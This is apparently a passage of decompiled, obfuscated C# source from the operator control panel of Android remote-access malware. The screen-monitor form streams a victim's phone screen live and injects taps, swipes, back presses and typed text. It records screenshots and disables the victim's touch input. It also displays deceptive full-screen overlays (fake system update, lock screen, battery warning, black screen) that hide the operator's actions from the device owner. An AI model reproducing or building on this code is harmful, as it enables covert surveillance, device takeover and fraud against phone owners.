			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._6B254005, BTConst.wrk);
			dictionary.Add(EXGuarder._0D552663, value);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			startbtn.Enabled = true;
			stopbtn.Enabled = false;
			CurrentState = BTConst.Disconnectedstr;
			viewimage.Image = null;
			myscr.Visible = false;
			if (websockclient != null)
			{
				websockclient.Disconnect(BTConst.livscrstr, Btcli.address);
				websockclient = null;
			}
		}
	}

	private void viewimage_MouseDown(object sender, MouseEventArgs e)
	{
		mouseDownTime = DateTime.Now;
		if (Operators.ConditionalCompareObjectEqual(ctrlbtn.Tag, EXGuarder._632A0252, TextCompare: false))
		{
			BTAlerter.infos(BTConst.enblctrlstr);
		}
		else if (e.Button == MouseButtons.Left)
		{
			trackPoints.Clear();
			startX = e.X;
			startY = e.Y;
			trackPoints.Add(new Point(startX, startY));
			isDown = true;
			isClick = true;
		}
	}

	private void viewimage_MouseMove(object sender, MouseEventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(ctrlbtn.Tag, EXGuarder._3A031614, TextCompare: false) || !isDown)
		{
			return;
		}
		checked
		{
			int num = Math.Abs(e.X - startX);
			int num2 = Math.Abs(e.Y - startY);
			if ((num > dragThreshold) | (num2 > dragThreshold))
			{
				isClick = false;
				if ((e.X > 0) & (e.Y > 0))
				{
					trackPoints.Add(new Point(e.X, e.Y));
				}
			}
		}
	}

	private void viewimage_MouseUp(object sender, MouseEventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(ctrlbtn.Tag, EXGuarder._57272D3B, TextCompare: false) || screenSize == default(Size))
		{
			return;
		}
		isDown = false;
		int num = viewimage.Width;
		int num2 = viewimage.Height;
		checked
		{
			if (isClick)
			{
				string data = JsonConvert.SerializeObject(new VB_0024AnonymousType_31<int, int>((int)Math.Round((double)startX * ((double)screenSize.Width / (double)num)), (int)Math.Round((double)startY * ((double)screenSize.Height / (double)num2))));
				MoveScreen(EXGuarder._57272D3B, Btcli.mobid, data);
			}
			else if (trackPoints.Count > 0)
			{
				if ((e.X > 0) & (e.Y > 0))
				{
					trackPoints.Add(new Point(e.X, e.Y));
				}
				List<Point> source = trackPoints.Select([SpecialName] (Point p) => new Point((int)Math.Round((double)p.X * ((double)screenSize.Width / (double)num)), (int)Math.Round((double)p.Y * ((double)screenSize.Height / (double)num2)))).ToList();
				string data2 = string.Join(EXGuarder._2E3C2F5D, source.Select([SpecialName] (Point p) => $"({p.X}, {p.Y})"));
				MoveScreen(EXGuarder._0D14412B, Btcli.mobid, data2);
			}
		}
	}

	private void MoveScreen(string movetype, string id, object data)
	{
		int num = checked((int)Math.Round((DateTime.Now - mouseDownTime).TotalMilliseconds));
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._115E5F31, EXGuarder._37375E3A);
		dictionary.Add(EXGuarder._4D596B70, EXGuarder._63725936);
		dictionary.Add(EXGuarder._46750705, movetype);
		dictionary.Add(EXGuarder._6200475D, num.ToString());
		dictionary.Add(EXGuarder._4830561C, RuntimeHelpers.GetObjectValue(data));
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, id, Btcli.Serverins.WSClient);
	}

	private void ScreenMonitor_FormClosing(object sender, FormClosingEventArgs e)
	{
		savertimer.Stop();
		if (viewimage.Image != null)
		{
			viewimage.Image = null;
		}
		statetimer.Stop();
		if (websockclient != null)
		{
			websockclient.Disconnect(BTConst.livscrstr, Btcli.address);
			websockclient = null;
		}
	}

	private void checkblocks_ValueChanged(object sender, bool value)
	{
	}

	private void checkskele_ValueChanged(object sender, bool value)
	{
	}

	private void DrakeUIColorPicker1_ValueChanged(object sender, Color value)
	{
		Color color = value;
		string value2 = EXGuarder._25445D1C + color.R.ToString(EXGuarder._4E1E3F0B) + color.G.ToString(EXGuarder._4E1E3F0B) + color.B.ToString(EXGuarder._4E1E3F0B);
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._61002815, EXGuarder._1D19726B);
		dictionary.Add(EXGuarder._604D5256, EXGuarder._6C645B61);
		dictionary.Add(EXGuarder._10607956, value2);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void sendquality()
	{
		string value = Conversions.ToString(BTRegistry.GetValue(EXGuarder._54690158, EXGuarder._130C220D));
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._4A691C52, EXGuarder._18252803);
		dictionary.Add(EXGuarder._74705C44, EXGuarder._131E326C);
		dictionary.Add(EXGuarder._14177568, value);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._354F2E3C, EXGuarder._5D044715);
		dictionary.Add(EXGuarder._4B327033, EXGuarder._523B4C66);
		dictionary.Add(EXGuarder._6C354806, EXGuarder._68524A27);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._455D1D26, EXGuarder._21120A26);
		dictionary.Add(EXGuarder._0014324D, EXGuarder._5C514D15);
		dictionary.Add(EXGuarder._19660A03, EXGuarder._124D4163);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._27221731, EXGuarder._4C1B1900);
		dictionary.Add(EXGuarder._74605D4A, EXGuarder._63795622);
		dictionary.Add(EXGuarder._40662C5C, EXGuarder._3F212370);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void DrakeUIButtonIcon4_Click_1(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._33097540, EXGuarder._67386C59);
		dictionary.Add(EXGuarder._72312742, EXGuarder._3B24770F);
		dictionary.Add(EXGuarder._19635031, EXGuarder._211B460F);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._13712762, EXGuarder._46295607);
		dictionary.Add(EXGuarder._632B0652, EXGuarder._5B1A2131);
		dictionary.Add(EXGuarder._1F17404E, EXGuarder._00634173);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void DrakeUIButtonIcon6_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._10074E76, EXGuarder._39536976);
		dictionary.Add(EXGuarder._4932756B, EXGuarder._141F272D);
		dictionary.Add(EXGuarder._4649641D, EXGuarder._716E3F0F);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void DrakeUIButtonIcon7_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._766A4261, EXGuarder._65231529);
		dictionary.Add(EXGuarder._58171B39, EXGuarder._5507142D);
		dictionary.Add(EXGuarder._452C4D75, EXGuarder._06614E0D);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void DrakeUIButtonIcon8_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._3541090A, EXGuarder._52544332);
		dictionary.Add(EXGuarder._4F4C524A, EXGuarder._6B576A77);
		dictionary.Add(EXGuarder._37670B5A, EXGuarder._63673410);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void statetimer_Tick(object sender, EventArgs e)
	{
		try
		{
			string _0206773D = EXGuarder._0206773D;
			if (FPS > 0 && stopbtn.Enabled)
			{
				_0206773D = EXGuarder._25624D6A + FPS;
				FPS = 0;
			}
			else
			{
				_0206773D = EXGuarder._20631749;
			}
			if (Btcli.isConnected)
			{
				myico.Image = Btcli.wallpaper;
				mytitle.Text = BTConst.LiveScreenstr + EXGuarder._64644B1F + Btcli.name + EXGuarder._64644B1F + Btcli.country + EXGuarder._64644B1F + _0206773D + EXGuarder._64644B1F + screenorinta + EXGuarder._64644B1F + CurrentState;
			}
			else
			{
				myico.Image = Resources.no_con;
				mytitle.Text = BTConst.LiveScreenstr + EXGuarder._64644B1F + BTConst.Disconnectedstr;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon11_Click(object sender, EventArgs e)
	{
		pressback();
	}

	private void pressback()
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._0F1A606D, EXGuarder._600D672B);
		dictionary.Add(EXGuarder._3F753B25, EXGuarder._1F136329);
		dictionary.Add(EXGuarder._1F136329, EXGuarder._1B433B4C);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void DrakeUIButtonIcon10_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._26646639, EXGuarder._2D36351C);
		dictionary.Add(EXGuarder._460C5712, EXGuarder._1C071D42);
		dictionary.Add(EXGuarder._1C071D42, EXGuarder._0D3F4C27);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void DrakeUIButtonIcon9_Click(object sender, EventArgs e)
	{
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._51277629, EXGuarder._77430F6A);
		dictionary.Add(EXGuarder._34055D58, EXGuarder._20296309);
		dictionary.Add(EXGuarder._20296309, EXGuarder._025E2B49);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void pintext_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Return)
		{
			string text = inputtext.Text;
			e.SuppressKeyPress = true;
			if (codes.StrisEmpty(text))
			{
				BTAlerter.infos(EXGuarder._580F0C67);
				return;
			}
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._6B4D4A6F, EXGuarder._456C4E6B);
			dictionary.Add(EXGuarder._731E5002, EXGuarder._5B79294D);
			dictionary.Add(EXGuarder._1E6A5E4C, text);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			inputtext.Text = EXGuarder._12355E37;
		}
	}

	private void PictureBox1_Click(object sender, EventArgs e)
	{
		if (smallviewimage.Image != null)
		{
			LiveisBigger = !LiveisBigger;
		}
	}

	private void ctrlbtn_Click(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(ctrlbtn.Tag, EXGuarder._400F5F0F, TextCompare: false))
		{
			ctrlbtn.Tag = EXGuarder._0978693E;
			ctrlbtn.ForeColor = Color.FromArgb(2, 176, 117);
			ctrlbtn.RectColor = Color.FromArgb(2, 176, 117);
		}
		else
		{
			ctrlbtn.Tag = EXGuarder._400F5F0F;
			ctrlbtn.ForeColor = Color.White;
			ctrlbtn.RectColor = Color.Gray;
		}
	}

	private void blockbtn_Click(object sender, EventArgs e)
	{
		string value = EXGuarder._37296B75;
		string value2 = EXGuarder._37296B75;
		string text = EXGuarder._37296B75;
		if (Operators.ConditionalCompareObjectEqual(blockbtn.Tag, EXGuarder._37296B75, TextCompare: false))
		{
			blocktoch.Enabled = true;
			value = EXGuarder._625E5D46;
			blockstyle blockstyle2 = new blockstyle();
			blockstyle2.inputtext2.Text = EXGuarder._3109315B;
			if (blockstyle2.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			text = blockstyle2.inputtext2.Text;
			if (codes.StrisEmpty(text))
			{
				text = EXGuarder._4C290C50;
			}
			switch (blockstyle2.comboblock.SelectedIndex)
			{
			case 0:
				value2 = codes.HtmlToBase64(Resources.Block_style_black.Replace(EXGuarder._64545F13, text));
				break;
			case 1:
			{
				string _705B4C0E = EXGuarder._705B4C0E;
				string newValue3 = EXGuarder._705B4C0E;
				if (blockstyle2.checkshowtimer.Checked)
				{
					_705B4C0E = blockstyle2.timerduration.Text;
					newValue3 = EXGuarder._33106C5F;
					newValue3 = blockstyle2.combotimers.SelectedIndex switch
					{
						0 => EXGuarder._33106C5F, 
						1 => EXGuarder._31786A0E, 
						2 => EXGuarder._0B6C2D13, 
						3 => EXGuarder._22113E41, 
						_ => EXGuarder._33106C5F, 
					};
				}
				value2 = codes.HtmlToBase64(Resources.Block_style_update.Replace(EXGuarder._3E420265, _705B4C0E).Replace(EXGuarder._52736640, newValue3));
				break;
			}
			case 2:
				value2 = codes.HtmlToBase64(Resources.Block_style_locked);
				break;
			case 3:
				value2 = codes.HtmlToBase64(Resources.Block_style_btry);
				break;
			case 4:
			{
				string _4C290C = blockstyle2.descrptiontext.Text;
				if (codes.StrisEmpty(_4C290C))
				{
					_4C290C = EXGuarder._4C290C50;
				}
				string text2 = Conversions.ToString(blockstyle2.imgbox.Tag);
				string newValue = EXGuarder._3109315B;
				string newValue2 = EXGuarder._0A773F3C;
				if (!codes.StrisEmpty(text2))
				{
					newValue = codes.BitmapToBase64(codes.ReadBitmapFromFile(text2));
					newValue2 = codes.GetImageMimeType(text2);
				}
				value2 = codes.HtmlToBase64(Resources.Block_style_custom.Replace(EXGuarder._1D3F7470, text).Replace(EXGuarder._255B164A, _4C290C).Replace(EXGuarder._2F0C3320, newValue2)
					.Replace(EXGuarder._6650441E, newValue));
				break;
			}
			default:
				BTAlerter.infos(EXGuarder._141C6129);
				return;
			}
			blockbtn.Tag = EXGuarder._625E5D46;
			blockbtn.ForeColor = Color.FromArgb(2, 176, 117);
			blockbtn.RectColor = Color.FromArgb(2, 176, 117);
		}
		else
		{
			blocktoch.Enabled = false;
			blockbtn.Tag = EXGuarder._37296B75;
			blockbtn.ForeColor = Color.White;
			blockbtn.RectColor = Color.Gray;
		}
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._74582C76, EXGuarder._3E096479);
		dictionary.Add(EXGuarder._710D0635, EXGuarder._06282346);
		dictionary.Add(EXGuarder._70633722, value);
		dictionary.Add(EXGuarder._0F0E044D, value2);
		dictionary.Add(EXGuarder._6066653B, text);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void DrakeUIButtonIcon12_Click(object sender, EventArgs e)
	{
		string value = EXGuarder._665D3F45;
		if (Operators.ConditionalCompareObjectEqual(skltonbtn.Tag, EXGuarder._665D3F45, TextCompare: false))
		{
			skltonbtn.Tag = EXGuarder._10230E03;
			value = EXGuarder._10230E03;
			skltonbtn.ForeColor = Color.FromArgb(2, 176, 117);
			skltonbtn.RectColor = Color.FromArgb(2, 176, 117);
		}
		else
		{
			skltonbtn.Tag = EXGuarder._665D3F45;
			skltonbtn.ForeColor = Color.White;
			skltonbtn.RectColor = Color.Gray;
		}
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._45703B14, EXGuarder._596A1D57);
		dictionary.Add(EXGuarder._3E777540, EXGuarder._11246214);
		dictionary.Add(EXGuarder._72106F17, value);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void recscr_Click(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(recscr.Tag, EXGuarder._3E3C0820, TextCompare: false))
		{
			recscr.Tag = EXGuarder._582F1740;
			recscr.ForeColor = Color.Lime;
			recscr.RectColor = Color.Lime;
			savertimer.Enabled = true;
			savertimer.Start();
			return;
		}
		recscr.Tag = EXGuarder._3E3C0820;
		recscr.ForeColor = Color.White;
		recscr.RectColor = Color.Gray;
		string text = Btcli.userfolder + EXGuarder._165D5C00;
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		Process.Start(text);
	}

	private void savertimer_Tick(object sender, EventArgs e)
	{
		try
		{
			if (Operators.ConditionalCompareObjectEqual(recscr.Tag, EXGuarder._42375D75, TextCompare: false))
			{
				savertimer.Stop();
				savertimer.Enabled = false;
			}
			else
			{
				if (viewimage.Image == null)
				{
					return;
				}
				Bitmap bitmap = (Bitmap)viewimage.Image.Clone();
				if (bitmap != null)
				{
					string text = Btcli.userfolder + EXGuarder._0400040F;
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					if (Directory.Exists(text))
					{
						bitmap.Save(text + EXGuarder._52160314 + DateAndTime.Now.ToString(EXGuarder._460F303D) + EXGuarder._176A1F36, ImageFormat.Jpeg);
					}
					bitmap.Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
	{
		if (Operators.ConditionalCompareObjectEqual(autorotbtn.Tag, EXGuarder._11163679, TextCompare: false))
		{
			autorotbtn.Tag = EXGuarder._5736256F;
			autorotbtn.ForeColor = Color.FromArgb(2, 176, 117);
			autorotbtn.RectColor = Color.FromArgb(2, 176, 117);
		}
		else
		{
			autorotbtn.Tag = EXGuarder._11163679;
			autorotbtn.ForeColor = Color.White;
			autorotbtn.RectColor = Color.Gray;
		}
	}

	private void blocktoch_Click(object sender, EventArgs e)
	{
		string value = EXGuarder._62262805;
		if (Operators.ConditionalCompareObjectEqual(blocktoch.Tag, EXGuarder._62262805, TextCompare: false))
		{
			blocktoch.Tag = EXGuarder._7863315A;
			value = EXGuarder._7863315A;
			blocktoch.ForeColor = Color.FromArgb(2, 176, 117);
			blocktoch.RectColor = Color.FromArgb(2, 176, 117);
		}
		else
		{
			blocktoch.Tag = EXGuarder._62262805;
			blocktoch.ForeColor = Color.White;
			blocktoch.RectColor = Color.Gray;
		}
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._61190973, EXGuarder._242B0B75);
		dictionary.Add(EXGuarder._0B756C19, EXGuarder._11493E3C);
		dictionary.Add(EXGuarder._73166736, value);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void slideTimer_Tick(object sender, EventArgs e)
	{
		checked
		{
			if (base.Width < slideTargetWidth)
			{
				base.Width += slideStep;
				if (base.Width >= slideTargetWidth)
				{
					base.Width = slideTargetWidth;
					slideTimer.Stop();
				}
			}
			else if (base.Width > slideTargetWidth)
			{
				base.Width -= slideStep;
				if (base.Width <= slideTargetWidth)
				{
					base.Width = slideTargetWidth;
					slideTimer.Stop();
					if (!panelExpanded)
					{
						confpanel.Visible = false;
					}
				}
			}
			else
			{
				slideTimer.Stop();
			}
		}
	}
}
